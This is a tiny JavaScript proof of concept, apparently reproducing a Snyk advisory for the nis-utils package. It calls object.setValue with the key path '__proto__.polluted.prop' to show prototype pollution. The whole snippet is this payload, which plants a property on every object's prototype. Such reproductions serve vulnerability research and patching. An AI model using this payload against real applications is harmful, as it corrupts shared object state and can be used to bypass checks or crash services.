//https://snyk.io/vuln/SNYK-JS-NISUTILS-598799
const nisUtils = require('nis-utils'); 

nisUtils.object.setValue({}, '__proto__.polluted.prop', "yes");
  